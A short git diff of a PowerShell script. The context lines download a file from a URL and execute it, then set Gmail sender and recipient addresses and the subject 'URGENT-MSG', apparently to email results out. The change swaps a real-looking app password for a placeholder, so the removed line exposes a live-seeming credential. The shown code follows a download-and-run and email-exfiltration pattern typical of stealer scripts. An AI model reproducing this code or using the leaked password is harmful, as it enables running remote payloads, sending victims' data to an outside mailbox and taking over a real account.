@@ -9,7 +9,7 @@ Invoke-WebRequest -Uri $URL -OutFile $FilePath
 Start-Process -FilePath $FilePath -ArgumentList $Command -Wait
 
 $Username = 'xpharoh1@gmail.com'
-$Password = 'wypuwcjskmqelujk'
+$Password = 'THISisNOTaREalPAssword'
 $EmailFrom = 'xpharoh1@gmail.com'
 $EmailTo = 'xpharoh@gmail.com'
 $Subject = 'URGENT-MSG'
